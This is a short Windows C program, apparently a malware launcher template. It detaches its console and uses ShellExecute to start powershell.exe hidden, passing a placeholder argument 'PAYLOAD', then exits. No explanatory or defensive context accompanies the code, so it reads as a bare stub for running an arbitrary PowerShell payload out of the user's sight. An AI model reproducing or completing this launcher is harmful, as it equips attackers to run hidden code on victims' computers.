#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <aclapi.h>
#include <shlobj.h>
#include <windows.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
int main(int argc, char *argv[])
{
FreeConsole();
 ShellExecute( NULL,NULL, "powershell.exe", "PAYLOAD",NULL,NULL);
exit(0);
}
